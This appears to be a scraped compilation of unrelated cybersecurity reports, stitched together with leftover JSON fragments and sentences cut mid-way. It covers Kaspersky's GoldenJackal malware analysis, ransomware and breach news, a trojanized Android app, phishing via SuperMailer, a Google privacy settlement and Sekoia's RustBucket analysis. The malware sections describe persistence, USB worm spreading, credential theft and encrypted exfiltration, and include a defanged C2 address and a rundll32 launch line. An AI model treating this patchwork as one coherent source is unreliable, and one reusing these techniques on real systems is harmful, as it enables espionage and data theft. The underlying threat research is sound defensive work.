malware’s persistence is usually guaranteed with one of the following mechanisms:The service is usually installed by the malware with the execution of the Windows sc.exe utility.\nThe registry value is equal to the copied malware file name, without the extension, and is stored under the following key:\nThe scheduled task is created using a hard-coded XML template that is modified at runtime and dropped in the file system using the same malware file path, but with a different extension, .xml instead of .exe.The generated XML file is then used with the Windows schtasks.exe utility to create the task.For example:\nThe task and service description change according to the variant.JackalSteal is another implant usually deployed on a few compromised machines that is used to find files of interest on the target’s system and exfiltrate them to the C2 server.This tool can be used to monitor removable USB drives, remote shares, and all logical drives in the targeted system. The malware can work as a standard process or as a service. It cannot maintain persistence, so it must be installed by another component.JackalSteal starts its execution by parsing the arguments.These options allow the attacker to specify the ‘profile’, which defines what files are of interest to the attackers. The profile consists of an ID and a list of patterns. Each pattern contains a list of options with the following properties:The command used to configure the JackalSteal component is as follows:\nThe unique identifier “–n” is usually the same BOT_ID generated by the JackalControl Trojan.After argument processing, the malware serializes the data in an XML, encrypts them with DES using a key generated from the ID passed with the “-n” option and stores the resulting payload in the following location: “%ApplicationData%\\SNMP\\cache\\%Filename%”, where %Filename% is a GUID generated from an MD5 of the unique identifier specified by the attacker.The malware is usually executed with the “/0” or “/1” option and the “-n” option, which is used to load the obtained profile ID. In the second case, it loads the profile from the previously mentioned location and it starts the ‘Watchers’.A Watcher is an object defined in a class with the same name that runs in a different thread and scans the location according to the specified options. The pattern could represent:When the pattern equals ‘all’, the malware enumerates all logical drives, and for each one it creates a new Watcher object. When the pattern is ‘usb’, it listens for system events corresponding to the action of creating a new removable drive on the system. When a new drive is detected, it creates a new Watcher object.Every time a new Watcher is added, the malware notifies the log of the event and sends the information to the remote C2 using HTTP Post requests.The log is created using the following string as a template:Path: {0}{1}\\r\\nMasks: {2}\\r\\nExclude: {3}\\r\\nDays: {4}\\r\\nMaxSize: {5}\\r\\nInterval: {6}And is uploaded inside an encrypted payload that contains the following information:|<AES_Key,AES_IV><Agent_id\\\\%yyyyMMddHHmmssfff%.log><Log content>|The AES_Key and AES_IV are generated for each request and are encrypted with the RSA algorithm using a key embedded in the code. The resulting payload is also compressed with the GZIP algorithm.The Agent_id\\\\Log_path.log and the Log content data are encrypted with the AES algorithm and compressed with GZIP.The Watcher objects are responsible for scanning activities. When a Watcher starts, it enumerates all files in the directory and its subdirectories. The scanner can also resolve the .lnk links. When the scanner detects a file that matches the defined properties (mask, days, max size, not in exclusions), it calculates the file content hash, checks if the resulting value is present in a hash table stored in the local cache directory and adds the value if not present. When a new file is detected, the malware uploads the file and the related filepath inside an encrypted payload using the same logic described above.In this case, the encrypted payload contains the following information:|<AES_Key,AES_IV><Agent_id\\\\Local_file_path><File content>|The Agent_id\\\\Local_file_path and the File content data are encrypted with the AES algorithm and compressed with GZIP.This worm was developed to spread and infect systems using removable USB drives. The program was designed as a flexible tool that can be used to infect systems with any malware.Its behavior changes according to the parent process.When the malware is working on a system that is already infected and the parent process is taskeng.exe or services.exe:The code used to monitor removable USB drives is the same one observed in JackalSteal. It creates a ManagementEventWatcher object, which allows it to subscribe to event notifications that correspond to a given WQL query and the issuing of a callback upon their interception. The query used by the malware instructs the system to check for a logical removable disk creation event every five seconds:\nWhen the malware detects a removable USB storage device, it will copy itself onto it. The path it will copy to is determined by listing all directories and selecting the one that was modified last. It will create a copy of itself on the drive root using the same directory name and change the directory’s attribute to “hidden”. This will result in the actual directory being hidden and replaced with a copy of the malware with the directory name. Moreover, JackalWorm uses an icon mimicking a Windows directory, tricking the user into executing the malware when trying to access a directory.In the following example, the removable drive “E:” was infected by the malware, which copied itself as Folder1.exe and changed the attributes of Folder1 to hide it:Infected deviceWhen the malware starts on a clean system and the parent process is explorer.exe and the file is located in a removable drive the behavior is as follows:The configuration files are embedded resources that contain XML data that can be used to instruct the worm to perform some actions:A valid configuration file looks like this:\nIn this case, the worm was configured to install the PE file stored in another resource “rcdata02”, save it with the extension .exe and create a scheduled task to run it every 15 minutes.Other valid examples are:\nDrops the PE file stored in another resource “rcdata02” in “%TEMP%\\test.exe” and executes it.\nExecutes the program “%WINDIR%\\system32\\ping.exe” with the argument “1.1.1.1”.In our investigations, we observed only the first example and the malware was configured to install the JackalControl Trojan.If it fails, it tries with a list of hard-coded directory names, which is a bit different from the procedure described above.The worm maintains its persistence by creating a scheduled task with a hard-coded XML template dynamically modified at runtime. Once installed, the worm deletes itself from the removable drive by using a batch script. The script is dropped in the local Temp directory with a random name:\nFuture removable drives that are attached will be re-infected with JackalWorm.It is also worth mentioning that this tool seems to be under development. We deduced this by analyzing the embedded .NET resources of the file 5DE309466B2163958C2E12C7B02D8384. Their size is 193973 bytes, which is much bigger than their actual content:It means there are 166770 bytes of unknown data. Most of them are part of the legitimate notepad.exe Windows utility, and specifically, the first 0x6A30 bytes were overwritten. After the legitimate notepad.exe image, we found also the following XML configurations:\n\nThe first XML shows a new type value: ‘scheduler’, which is not specified in the code. The second XML shows that this specific resource was used for testing purposes and the attacker was trying to run cmd.exe to write the word “TEST” in a text file in the desktop: %USERPROFILE%\\Desktop\\test.txt.This malware was developed to collect information about the compromised system, as well as a specific set of files that could potentially be used to retrieve stored credentials and the user’s web activities. The attacker named it “perinfo”, a contraction of the program’s main class name PersonalInfoContainer.Its behaviour changes according to the number of arguments provided during execution. Specifically, when executed with only one argument, the malware collects a predefined set of information and stores it in a binary file compressed with GZIP. The filename is specified in the argument provided. When executed with two arguments, the malware uses the first argument to load a previously generated binary file and extract all the information to a directory specified by the second argument.By default, the program should be executed with one argument. Once it is executed, the malware starts collecting information about the system using a specific function, GetSysInfo, which collects the following information:\nThis specific function was also observed in the first JackalControl variants, but was removed from newer variants.The malware continues its operation by enumerating the logical drives on the system; and for each one it enumerates the files in the root path. The collected info includes the last write time, the filename, and the file size.It then enumerates the Users directory in the system drive, usually C:\\Users\\. For each user, it enumerates the content of the following directories:It tries also to acquire the following files:\nThe malware attempts to steal credentials stored in the victim’s browser databases, as well as other information such as cookies that could be used to gain access to web services.Finally, it serializes the collected information to a binary format, compresses all the data with the GZIP algorithm, and stores everything in the file specified with the first argument provided by the attacker.This tool is used to collect screenshots of the victim’s desktop and sends the pictures to a remote, hard-coded C2 server:hxxps://tahaherbal[.]ir/wp-includes/class-wp-http-iwr-client.phpThis specific webpage was also used as a C2 for the JackalSteal component, indicating that the tools are probably part of a unique framework.The malware can handle some arguments that are optional and can be provided as input:The program’s primary function involves running a thread that scans all displays on the system, checking their dimensions. It then starts an infinite loop, periodically checking if the user is active on the system. Whenever the malware detects user activity, it captures a screenshot and sends it to the remote server.User activity is detected by monitoring the cursor’s position and checking if it has changed since the last recorded position. After uploading a screenshot, it waits for a specified interval before restarting the loop.The screenshots are uploaded inside an encrypted payload using HTTP Post requests.The encrypted payload is similar to that used by JackalSteal and contains the following information:|<AES_Key,AES_IV><Remote filename><Screenshot>|AES_Key and AES_IV are encrypted with the RSA algorithm using a key embedded in the code. The resulting payload is also compressed with the GZIP algorithm.The Remote filename and Screenshot data are encrypted with the AES algorithm and compressed with GZIP. The RSA key is the same as that observed in other JackalSteal components.GoldenJackal activity is characterized by the use of compromised WordPress websites as a method to host C2-related logic. We believe the attackers upload a malicious PHP file that is used as a relay to forward web requests to another backbone C2 server.We don’t have any evidence of the vulnerabilities used to compromise the sites. However, we did observe that many of the websites were using obsolete versions of WordPress and some had also been defaced or infected with previously uploaded web shells, likely as a result of low-key hacktivist or cybercriminal activity. For this reason, we assess that the vulnerabilities used to breach these websites are known ones rather than 0-days.The remote webpage usually replies with a fake “Not Found” page. The HTTP response status code is “200”, but the HTTP body shows a “Not found” webpage.\nIn specific cases, the attacker provides a valid response with a list of commands. In those cases, the previous body is followed by a long list of standard Windows new line sequences – “\\r\\n” – and finally the previously mentioned delimiter:Over the years, we have observed a limited number of attacks against government and diplomatic entities in the Middle East and South Asia. We observed victims in: Afghanistan, Azerbaijan, Iran, Iraq, Pakistan and Turkey.Geography of victimsWe are unable to link GoldenJackal to any known actor.During our investigations, we observed some similarities between GoldenJackal and Turla. Specifically, we noticed a code similarity in the victim UID generation algorithm that overlaps somewhat with that used by Kazuar.Specifically, Kazuar gets the MD5 hash of a predefined string and then XORs it with a four-byte unique “seed” from the machine. The seed is obtained by fetching the serial number of the volume where the operating system is installed.\nJackalControl uses an MD5+SHIFT algorithm. It collects a set of information from the machine, including the serial number of the volume where the operating system is installed, to generate a unique seed with the MD5 algorithm. Then it uses the resulting byte array, summing every two consecutive bytes from the resulting MD5 hash and placing the resulting bytes (modulus 256) as the sequence that constructs the final BOT_ID.Code snippet used to generate the BOT_IDMoreover, the use of tools developed in .NET and of compromised WordPress websites as C2 is a common Turla TTP.Last but not least, the groups share an interest in the same targets, and in one specific case we observed that a victim machine was infected with a Turla artifact two months before the GoldenJackal infection.Despite these similarities, we assessed with low confidence that there is a connection between GoldenJackal and Turla, since neither of these is unique to either threat actor. The use of compromised WordPress websites is not a unique TTP. This technique was also observed in activity by other groups such as BlackShadow, another APT active in the Middle East that uses .NET malware. The code similarities are related to a single function in a .NET program that could be easily copied with a decompiler. It is possible that GoldenJackal used that algorithm as a false flag. Another hypothesis is that the developers behind JackalControl were inspired by Turla and decided to replicate the UID generation algorithm. Finally, the shared interest in the same targets is easily explained by the fact that the victims are high-profile targets that could be considered interesting by different actors.GoldenJackal is an interesting APT actor that tries to keep a low profile. Despite its long-term activities, which are believed to have started in June 2019, this group and the related samples are still generally unknown.The group is probably trying to reduce its visibility by limiting the number of victims. According to our telemetry, the number of targets is very low and most of them were related to government or diplomatic entities. Moreover, some of the samples were deployed only on systems that were not protected by Kaspersky during the infection phase. This may indicate that the actor is trying to protect some of its tools and avoid specific security solutions.Their toolkit seems to be under development – the number of variants shows that they are still investing in it. The latest malware, JackalWorm, appeared in the second half of 2022 and appears to still be in the testing phase. This tool was unexpected because in previous years the attacks were limited to a small group of high-profile entities, and a tool like JackalWorm is probably difficult to bind and can easily get out of control.AuthorsMeet the GoldenJackal APT group.

It is the third-longest continuously operating daily newspaper in the U.S., founded in 1829, and it has won 20 Pulitzer Prizes for its journalistic excellence.The attack disrupted the publication of the Sunday print newspaper, so home-delivery subscribers received an early edition composed on Friday and were invited to catch up with the latest news on the newspaper's website (inquirer.com), which remained unaffected.At the time, a spokesperson for the newspaper did not clarify if the attack was ransomware and kindly requested patience until the ongoing investigation completes.However, today, the cyberattack was claimed by the Cuba ransomware gang in a post on their extortion site, declaring that they stole files from the newspaper's computers on May 12th, 2023.The stolen data, now publicly released on Cuba's extortion portal, includes, according to the threat actors, financial documents, correspondence with bank employees, account movements, balance sheets, tax documents, compensation, and source code. BleepingComputer was not able to determine the authenticity of these claims.The fact that allegedly stolen files were made available for free indicates that the newspaper has refused to pay a ransom, so the extortion process reached a dead end.The Inquirer further states that they are still investigating whether personal data was stolen during the attack, and if discovered, will notify impacted individuals.The ransomware gang was also linked to attacks on Ukrainian government agencies after phishing emails delivered the \"ROMCOM RAT\" malware, a remote access trojan associated with a known Cuba ransomware affiliate.Update 5/24 - Article updated to reflect that the type of data Cuba ransomware leaked on its extortion site has not been verified to belong to Philadelphia Inquirer. Added link to Inquirer story stating data does not belong to them."

      "text": " A relatively unknown advanced persistent threat (APT) group named 'GoldenJackal' has been targeting government and diplomatic entities in Asia since 2019 for espionage.The threat actors have maintained a low profile for stealthiness, carefully selecting their victims and keeping the number of attacks at a minimum to reduce the likelihood of exposure.Kaspersky has been tracking GoldenJackal since 2020, and today reports that the threat actors have had notable activity in Afghanistan, Azerbaijan, Iran, Iraq, Pakistan, and Turkey.\"Despite the fact that they began their activities years ago, this group is generally unknown and, as far as we know, has not been publicly described.\"Additionally, Kaspersky has seen a case of trojanized 'Skype for Business' installers that drop a trojan alongside a legitimate copy of the software.While Kaspersky's analysts have noticed code and TTP (techniques, tactics, and procedures) similarities with Turla, they track GoldenJackal as a separate activity cluster.According to Kaspersky, GoldenJackal employs a set of custom .NET malware tools that provide various functions, including credential dumping, data stealing, malware loading, lateral movement, file exfiltration, and more.The primary payload used first to infect a system is 'JackalControl,' which gives the attackers remote control over the infected computer.The malware can be run as a program or a Windows service and can establish persistence by adding Registry keys, Windows scheduled tasks, or Windows services.It receives encoded commands from the C2 server via HTTP POST requests, which concern the execution of arbitrary programs, exfiltration of files, or fetching additional payloads from the C2.The second tool used by the hackers is 'JackalSteal,' an implant devoted to data exfiltration from all logical drives on the compromised computer, including remote shares and even newly connected USB drives.The attackers can execute the stealer with arguments determining the targeted file types, paths, sizes, when files were last used, and exclude specific paths that security tools might monitor.All files matching the set parameters are encrypted using AES, RSA, or DES, then compressed with GZIP, and eventually transmitted to the C2 server.The third tool in GoldenJackal's arsenal is 'JackalWorm,' which infects USB drives to spread on potentially other valuable computers.\"When the malware detects a removable USB storage device, it will copy itself onto it,\" reads the Kaspersky report.\"It will create a copy of itself on the drive root using the same directory name and change the directory's attribute to \"hidden.\" This will result in the actual directory being hidden and replaced with a copy of the malware with the directory name.\"To obfuscate its nature and trick the victim into executing it, 'JackalWorm' uses a Windows directory icon on the removable drive.If that happens, the worm will infect the host system, establish persistence by creating a scheduled task, and then wipe its copy from the USB drive.The fourth tool used by the Golden Jackal APT is 'JacklPerInfo,' a basic system information collector with the additional capabilities of identifying and exfiltrating browsing history and credentials stored in web browsers.Serving like a typical info-stealer malware, JacklPerInfo can also exfiltrate files from the Desktop, Documents, Downloads, and AppData\\Roaming\\Microsoft\\Windows\\Recent directories.The fifth and final malware tool presented in Kaspersky's report is the 'JackalScreenWatcher,' which is used for snapping screenshots on the infected device.The operators can specify the resolution and image-capturing time intervals, and the tool will send the media to the C2 via HTTP POST requests in the form of encrypted payloads.In conclusion, GoldenJackal has been carefully using an extensive set of custom tools against a limited number of victims to carry out what Kaspersky believes are long-term espionage operations.Although few things are known about the APT's operational tactics, the diversity in the observed infection chains combined with highly capable malware tools leaves no doubt that this is a sophisticated threat actor."

      "text": " Image: Bing Image CreatorESET malware researchers found a new remote access trojan (RAT) on the Google Play Store, hidden in an Android screen recording app with tens of thousands of installs.While first added to the store in September 2021, the 'iRecorder - Screen Recorder' app was likely trojanized via a malicious update released almost a year later, in August 2022.The app's name made it easier to ask permission to record audio and access files on the infected devices since the request matched the expected capabilities of a screen recording tool.Before its removal, the app amassed over 50,000 installations on the Google Play Store, exposing users to malware infections.\"However, it is important to note that the app can also be found on alternative and unofficial Android markets. The iRecorder developer also provides other applications on Google Play, but they don't contain malicious code.\"It has a wide range of capabilities, including but not limited to tracking infected devices' location, stealing call logs, contacts, and text messages, sending SMS messages, taking pictures, and recording background audio.Upon closer examination, ESET found that the malicious screen recording app itself only used a subset of the RAT's capabilities as it was used only to create and exfiltrate ambient sound recordings and to steal files with specific extensions, hinting at potential espionage activities.\"Nevertheless, we cannot ascribe the current samples to any specific group, and there are no indications that they were produced by a known advanced persistent threat (APT) group.\"Update: A Google spokesperson shared the following statement after the article was published:"

Currently, the campaign focuses on shipping and logistics companies, aligning with Iran’s focus on the sector for the past three years.”The ClearSky team has attributed the attack with low confidence to Tortoiseshell, also known as TA456 or Imperial Kitten, a hacking group traditionally linked to Iranian cyber operations.“Previous Tortoiseshell attacks have been observed using both custom and off-the-shelf malware to target IT providers in Saudi Arabia in what appeared to be supply chain attacks with the end goal of compromising the IT providers’ customers,” ClearSky explained.To trick unsuspecting visitors, the attackers impersonated the legitimate JavaScript framework “jQuery” by utilizing domain names similar to the original ones. ClearSky said the technique was previously employed in a 2017 Iranian campaign. The attackers also utilized open-source penetration test tools, incorporating code from the Metasploit framework alongside unique strings.ClearSky said it identified eight infected websites compromised using a similar JavaScript method. While most of the websites have been cleared of the malicious code, ClearSky said further investigation is ongoing to ensure the complete eradication of the threat."

      "text": "  In an agreement to resolve allegations over Google's misleading location tracking practices, the tech giant has agreed to pay the state of Washington $39.9 million and to implement court-ordered reforms to increase transparency about its location tracking settings.In addition to a multi-state investigation into Google’s geolocation practices, Ferguson filed a lawsuit in King County Superior Court on behalf of Washington residents in January 2022.Both the lawsuit and investigation were initiated after reports showed Google possibly misled consumers with its “Web and App Activity” settings. In 2018, AP data showed Google was using deceptive and unfair practices to obtain users’ \"consent\" to be tracked, which made it “nearly impossible for users to stop Google from collecting their location data.” Among its claims, Google was accused of collecting location data even when users disabled location history, misleading descriptions in location settings, tracking Android devices even when location access was turned off, and “repeatedly nudging users to consent to location tracking,” among other allegations.What’s more, the lawsuit asserted that the tech company “profits significantly” from selling consumer data for advertising purposes, and location data is allegedly the key to Google’s advertising business.For example, when users enable the “Location History” setting, Google allegedly saves the location data of the users to provide more personalized recommendations.“For years, Google’s help page stated, ‘With Location History off, the places you go are no longer stored.’ That statement was false,” according to the lawsuit. “For example, the company collects location data under a separate setting — ‘Web & App Activity’— that is defaulted ‘on’ for all Google Accounts.”Google sought to have the lawsuit dismissed in May 2022, which was blocked by a King County Superior Court judge.The settlement will resolve the state’s allegations. Ferguson said funds from the fine will be used for continued enforcement of the state’s Consumer Protection Act, as well as future actions aimed to protect the data privacy of its residents. Washington’s Consumer Protection Division is largely funded through recoveries made through these types of enforcement actions.“Google denied Washington consumers the ability to choose whether the company could track their sensitive location data, deceived them about their privacy options and profited from that conduct,” Ferguson said in a statement.In addition to the monetary fine, Google is required to be more transparent with consumers about its tracking and use of consumer data. The new data privacy requirements include providing additional information to users when location-related accounts settings are enabled, including the sources, purpose, and retention of location data.Google is also required to make sure users can view location tracking details and establish an enhanced “Location Technologies” webpage, which will provide insights into the types of location data  collected by Google and how it is used by the company.The tech giant is currently facing an inquiry by the Department of Justice and a bipartisan group of state attorneys general in an antitrust lawsuit, which is seeking to break up “Google’s monopolization of display advertising.” They claim Google’s online display advertising market has “funneled” more business through its services and impacted the profits of competing companies.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.TechCrunch reports that two-factor authentication has been required by major U.S. genetic testing and genealogy firms 23andMe, Ancestry, and MyHeritage in the aftermath of the significant 23andMe breach, which resulted in the theft of data from more than a million of its Jewish Ashkenazi and Chinese users.Singaporean luxury resort and casino Marina Bay Sands had data from nearly 665,000 customers compromised following a cyber incident between Oct. 19 and 20, BleepingComputer reports.Canadian nonprofit shared service provider TransForm has confirmed being impacted by a ransomware attack, which resulted in the exfiltration of a database that included information from its five co-founding hospitals across Ontario, reports BleepingComputer.On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": " \"Combining SuperMailer's customization features and sending capabilities with evasion tactics, the threat actors behind the campaign have delivered tailored, legitimate-looking emails to inboxes spanning every industry,\" explained Brad Haas, cyber threat intelligence analyst at Cofense and author of the research.What makes the numbers even more interesting is the fact that SuperMailer is a somewhat obscure German-based newsletter product that has nowhere near the scale of more well-known email generators such as ExpertSender or SendGrid, Hass tells Dark Reading — yet it's still behind wide swathes of malicious emails.\"SuperMailer is desktop software that can be downloaded for free or for a nominal fee from a number of sites that may be completely unassociated with the developer,\" he says. \"A free version of SuperMailer was released on CNET in 2019, and since that point has had approximately 1,700 downloads. This number is low in comparison to many popular software downloads, but we do not have any other information on the number of legitimate organizational users.\"SuperMailer did not immediately respond to Dark Reading's request for comment. But since the clients are propagated via third-party websites and have no server or cloud component, Haas notes that SuperMailer's metaphorical hands are tied when it comes to rooting out the activity.\"In the past, we've seen large, cloud-based services abused to send phishing emails or create unique URL redirects pointing to phishing pages, but those services often catch and combat the activity after a period of time,\" he says. \"We do not know the extent to which the SuperMailer developer is capable of fighting this abuse.\"That in of itself makes SuperMailer attractive to cybercriminals. But the other reason is that it offers an attractive disguise for getting past SEGs and ultimately end users, thanks to some unique features.In this case, SuperMailer offers compatibility with several email systems, which allows threat actors to spread their sending operation across multiple services — this decreases the risk that a SEG or upstream email server will classify emails as unwanted due to reputation.\"The threat actors likely have access to a variety of compromised accounts, and they use SuperMailer's sending features to rotate through them,\" Haas wrote in his report on the threat.The SuperMailer-generated campaigns also take advantage of template customization features, like the ability to automatically populate a recipient's name, email, organization name, email reply chains, and more — all of which boosts the legitimacy of the email for targets.\"If a SEG does not follow the redirect, it will only check the content or reputation of the legitimate website,\" Haas said in the report. \"Although open redirects are generally considered to be a weakness, they can often be found even on high-profile sites. For example, the campaigns we analyzed used an open redirect on YouTube.\"Cofense has been able to track the SuperMailer activity thanks to a coding mistake that the attackers made while crafting the email templates: The emails have all included a unique string showing that they were produced by SuperMailer. However, parsing messages for that string or more broadly blocking entire legitimate mailing services isn't the answer.\"We haven't yet uncovered any default characteristics that would allow us to broadly block emails generated by SuperMailer,\" Haas says. \"In this case, the identifiable characteristics were discoverable only due to a mistake by the threat actor. Without the mistake, it wouldn't be feasible, as those characteristics are not visible in every SuperMailer email.\"However, he notes that there are other characteristics that would identify the emails as potential security threats, even without knowing their origin — including their content. An example would be non-target-specific email reply chains appended to the messages.This is especially important given that Cofense has discovered that the SuperMailer phishes are part of a larger set of activity that has accounted for a full 14% of phishing emails landing in inboxes in May in the Cofense telemetry. Haas explained that all of the emails — SuperMailer-sent and the others — share certain indicators that tie them all together, such as the use of URL randomization.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": "  The FBI is actively working with Norton Healthcare to determine the scope of an ongoing cyberattack, as the Louisville, Kentucky, health network works to recover a number of patient care systems.On May 9, the information services team discovered suspicious network activity and deployed defensive measures. While data extortion and ransomware were not mentioned, the team also received a fax “containing threats and demands,” a common tactic used by threat groups. At the time of the fax, the network remained operational. Norton Healthcare officials stressed that the systems were proactively brought down in a controlled fashion: “at no point did an external force take control of or shut down our network.”The information services team was able to thwart the impact of the attack and keep the network within their control. But with the network offline, clinicians are leveraging manual and paper processes to maintain services. All Norton Healthcare facilities remain open for all patient care. However, the outage has caused long wait times for both phone calls and in-person patient visits, as well as “delays in network-related capabilities,” including imaging, lab and test results, prescription refills, and the Norton MyChart patient messaging platform.The response team is “working as quickly as we can to bring systems back online,” while prioritizing patients with urgent medical needs. Patients seeking same-day appointments for illnesses, minor injuries, or other non-emergency care are urged to visit an urgent care location, rather than the main hospital. What’s more, a May 22 update informs patients that providers are working through a backlog of messages sent through its online patient time, which is causing lengthy response times of three to five business days. Patients were also notified that providers are still calling “all uncontrolled medications” to desired pharmacies.“This has been a challenging time for our organization, and we have continued to care for and show compassion to our community,” officials said in a statement. “We understand the community has many questions. We know our patients have questions. We do too and experts are working as quickly as they can to get answers.”Currently, Norton Healthcare is analyzing each impacted application to ensure all risks have been mitigated before bringing devices back online. The response team “is working as quickly as they can. This is an incredibly time-consuming but critical process.”Amazon Pharmacy’s PillPack arm recently began informing a subset of users that their accounts were accessed by an unknown actor. Of the 19,032 hacker accounts, 3,614 contained prescription information.First discovered on April 3 as part of routine security monitoring, the PillPack team discovered suspicious log-in attempts against some customer accounts. The subsequent investigation determined a threat actor accessed the accounts over the course of four days, between April 2 and April 6.The actor was able to access the accounts using valid customer email addresses and passwords. The team confirmed those credentials were not stolen from PillPack. Officials say this evidence suggests “customers used the same email and password for another website” that was likely accessed by the attacker.The compromised data included email addresses, details related to PillPack prescriptions, and contact information of prescribing providers. No Social Security numbers or payment cards were affected.After discovering the access, PillPack reset all account passwords to prevent a recurrence, in addition to enabling multi-factor authentication on all accounts. Reports show MFA is vastly more effective than passwords alone for account and device security.A systems’ hack and subsequent data exfiltration incident against R&B Corporation of Virginia, doing business as Credit Control Corporation, led to the theft of protected health information for 345,523 patients tied to 13 provider networks. CCC is a third-party collections agency for the healthcare sector.On March 7, CCC found “unusual activity” on several network systems and promptly isolated the devices. The response team found an attacker accessed and copied “certain files” from the network between March 2 and March 7.A review confirmed the stolen data varied by patient and included names, SSNs, contact details, and information tied to the “business partner,” such as account numbers, balances, and dates of service. All affected individuals are being provided credit monitoring and identity protection services.The impacted providers include Sentara Health System, Riverside Health System, UVA Health, Bayview Physicians, Pariser Dermatology Specialists, Valley Health System, Dominion Pathology, Children’s Hospital of the King’s Daughters Health System, VCU Health System, Chesapeake Regional Medical Center, Mary Washington Healthcare, and Tidewater Physicians.CCC has since confirmed its network security, reviewed relevant files, and informed federal law enforcement.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.TechCrunch reports that two-factor authentication has been required by major U.S. genetic testing and genealogy firms 23andMe, Ancestry, and MyHeritage in the aftermath of the significant 23andMe breach, which resulted in the theft of data from more than a million of its Jewish Ashkenazi and Chinese users.Singaporean luxury resort and casino Marina Bay Sands had data from nearly 665,000 customers compromised following a cyber incident between Oct. 19 and 20, BleepingComputer reports.Canadian nonprofit shared service provider TransForm has confirmed being impacted by a ransomware attack, which resulted in the exfiltration of a database that included information from its five co-founding hospitals across Ontario, reports BleepingComputer.On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

You have to login to access the Reading Center functionalities!\nUsername or Email Address\n\n\nPassword\n\n Remember Me\n\n\nIn April 2023, fellow security researchers at Jamf published a report on Bluenoroff’s RustBucket, a newly observed malware targeting macOS platform. Sekoia.io analysts further investigated Bluenoroff’s infrastructure and share their findings in this report.In April 2023, fellow security researchers at Jamf published a report on Bluenoroff’s RustBucket, a newly observed malware targeting macOS platform. Sekoia.io analysts further investigated Bluenoroff’s infrastructure and share their findings in this report.Since the end of 2021 and through 2022, Bluenoroff continuously used the same TTPs. However, Sekoia.io analysts observed recent modifications, as described in the report previously referenced.The RustBucket infection chain consists of a macOS installer that installs a backdoored, yet functional, PDF reader. The fake PDF reader then requires opening a specific PDF file that operates as a key to trigger the malicious activity. When opened in a classical PDF reader, the PDF document displays a message asking the user to open the document in the proper reader (i.e. the backdoored one). When opened in this reader, the PDF displays a nine pages document about a venture capital company that appears to be the printout of a legit company’s website. The fake PDF reader uses a hardcoded 100-bytes XOR key to decrypt the new content of the document and the C2 server configuration.Figure 1. Key PDF document when opened in a PDF ReaderWhen the proper PDF file is submitted to the fake PDF reader, it requests its C2 server encoded in the PDF file using an HTTP POST request to download and execute a new payload. The new payload is the backdoor component of the RustBucket kill chain, collecting information about the compromised system, sending it to its C2 server and requesting for commands.This new technique is interesting as it makes it more complex to track. We need to find the fake readers and the right PDF file to get relevant results from sandboxes. While the usage of a modified PDF reader was already observed during Lazarus’ DreamJob campaign in 2020, it is the first time we observe it to target macOS. Sekoia.io analysts created YARA rules and collected new samples complementing Jam’s findings, available in the IOCs section.During our investigation on the macOS variant, Sekoia.io analysts identified a .NET version of RustBucket, with a similar GUI, developed using the library DevExpress.XtraPdfViewer. The malware was embedded in a ZIP archive containing the PDF reader and the “key” PDF requiring user interaction.Figure 2. Windows RustBucket archive’s contentSimilarly to the RustBucket macOS version, when the user opens the PDF file in another PDF reader, it opens a one-pager with a message stating the file is protected and must be opened with the “internal” reader. When the file is opened with the fake PDF reader, it prints a sixteen pages document containing a list of contacts.Figure 3. (left) Key PDF document opened in Firefox, (right) Key PDF document opened in the Internal PDF viewerDuring our analysis, we observed that both Windows and MacOS RustBucket’s versions use the same decryption key. The executable PdfViewer.exe decrypts the malicious PDF and calls the Create function of the DevExpress.Xpo.v19.2.dll Library with the C2 url as parameter (if a legitimate PDF is chosen, an error is returned ”Can’t decrypt PDF file”). Then two other DLLs are also used to load the backdoor, as detailed here above and in Figure 4.PdfViewer/DevExpress.Xpo.v19.2.dllThe purpose of this DLL is to retrieve the process ID of an explorer.exe process. Then, the function Create of the DevExpress.XtraList.v19.2.dll library is called with the URL and the process ID as parameters.PdfViewer/DevExpress.XtraList.v19.2.dllThe purpose of this DLL is to load and call the DevExpress.Xpr.v19.2.dll library. This DLL checks for some antivirus on the infected machine: Bitdefender, Kaspersky, Sophos, AvastSvc, Norton, Avira, AVG and WindowsDefender. If one of this antivirus is found, the DLL call the OpenProcess API to run the following command:rundll32.exe %s\\DevExpress.Xpr.v19.2.dll,UpdateIf there is no antivirus, the DLL perform code injection on the provided explorer.exe process. The injected payload starts by decrypted itself into the DevExpress.Xpr.v19.2.dll.DevExpress.Xpr.v19.2.dllThis DLL is called via the Update function which gives back the execution flow to the DLLMain function with 0xD8E1 as reason code (instead of 0, 1, 2 or 3).\nThen a new thread is created. This backdoor collects information about the compromised machine (name, active processes, network configuration, etc.) and sends this information to the C2 using POST requests. It also has the capability to load a next stage (we assess that this next stage is provided by the C2).\nThe backdoor collects information about the compromised machine and the active processes and sends this information to the C2 using POST requests.This DLL is called via the Update function which gives back the execution flow to the DLLMain function with 0xD8E1 as reason code (instead of 0, 1, 2 or 3).\nThen a new thread is created.

